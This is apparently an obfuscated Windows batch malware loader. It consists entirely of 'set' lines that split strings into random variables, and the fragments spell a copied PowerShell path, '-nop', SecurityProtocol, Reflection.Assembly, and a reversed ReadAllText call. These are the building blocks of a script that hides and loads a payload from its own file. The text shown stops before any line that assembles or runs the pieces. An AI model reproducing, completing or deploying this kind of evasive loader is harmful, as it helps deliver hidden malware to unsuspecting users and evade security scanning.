@echo off
set "XzBCxiivSf=xe"
set "ujXoDzHMuw=he"
set "hLFZfHzWOk=rs"
set "vUxsjjubAh=Sy"
set "USpcPkcldj=we"
set "sgJwELuHtq=we"
set "bzexIWbYgW=he"
set "LEdOKQEUoK=\v"
set "iDjBfpSphG=do"
set "VgHmvUuffa=co"
set "CjHIVKRIjw=rS"
set "SHkVOgIVcC=:\"
set "rxHfTvNRtS=1."
set "MqbUgHTNGm=st"
set "DSqHjRFbLJ=in"
set "NTbIyNQgXn=ws"
set "ZxeBActIBn=ll"
set "YnIOukREFs=Wi"
set "bJmjvHusTi=nd"
set "alCkuifQCV=Po"
set "KBJvqxFXUh=s\"
set "jdegZAwuWa=0\"
set "jbNmLVDYSo=ll"
set "gSPULxvqMR=po"
set "NlNiyuzOoI=\W"
set "dInWqJGdyd= /"
set "fObGSvnPPd=.e"
set "QxjertwLXo=py"
set "YDpvHzaRSY=em"
set "vrtUhimnpk=ow"
set "KnLpsmzdLk= C"
set "bwyMMAUaLY=32"
set "oRvAeFhrvi=y "
set "lkCydfLQOX= %~dp0"
set "YfBYMEHzuJ=cd"
set "YcyfefzOdG=.Sec"
set "TdaXqcffqf=)))"
set "lIPHazkVQi=  $c"
set "yxfezXnQQp=;$xv"
set "bOzudEMhxW=gth)"
set "BnUEcsRtPc=ss -"
set "QluXwGzlji=[Sys"
set "LMptUggNcJ=comm"
set "eqeTueedhk=L4Yi"
set "iBmAGBJzsl=, (,"
set "LwcXCACfKJ=[Sys"
set "duJfbHpIID=dbAA"
set "qwycFXwanC=New-"
set "EFqkbpQTRC=CFxo"
set "RLDFOpcWzy=106u"
set "VNjurvxZkj=);$d"
set "JzwetUaNOh=-nop"
set "lbqrhyTDxj=tem."
set "SRTgRuTNON=ateD"
set "eLQAXnIaRb=rt]:"
set "crLtyTkSAf=t Sy"
set "ZunTMFAriH='')("
set "loDJcQSWhT=[Env"
set "BmrsSAiePQ=I, 0"
set "bGiUHcRoww=rity"
set "KfhlwNkmdn=sNOl"
set "cesJwaeLAz=]::C"
set "KfwhjAzepS=ring"
set "GimaPrXHWl=.Len"
set "MODiDCvjxB=;$ni"
set "wEciYQqNkF=lNE."
set "fMogrdYFSs=]::("
set "DJOOAbkqnt=brea"
set "SCrsijsPbs=yTo("
set "ReQFsFlLzR=Stre"
set "HBdBKbyexa=oArr"
set "CdCEjgNlXs='txe"
set "FbgomCteuR=.Ass"
set "IuanaIzkFT=();$"
set "gItovoXJwm=ispo"
set "ciTiPQlTEW=fore"
set "JPsjTZrlHW=$WGh"
set "UCMOmOXxxf=tS46"
set "xnRpOZnjFw=daeR"
set "KYCbJiLwpA=tsNO"
set "kifWFSyNKj=hy.A"
set "KjVgalkOUJ=;$Ia"
set "rfQnRePMbS=-joi"
set "BqIigenDbl=('da"
set "CTrGqCABlE=PxEW"
set "uvPTpbNmUA=grap"
set "eDNIkxFWAz=yste"
